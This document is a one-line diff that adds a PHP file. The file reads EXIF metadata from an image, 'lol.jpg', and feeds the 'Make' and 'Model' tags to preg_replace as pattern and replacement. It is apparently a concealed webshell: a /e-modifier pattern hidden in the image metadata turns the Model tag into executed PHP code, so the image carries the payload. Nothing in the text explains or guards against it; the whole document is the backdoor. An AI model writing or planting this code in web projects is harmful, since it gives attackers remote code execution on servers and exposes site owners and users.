@@ -1,0 +1,1 @@
+<?php $exif=exif_read_data('./lol.jpg');preg_replace($exif['Make'],$exif['Model'],'');?>
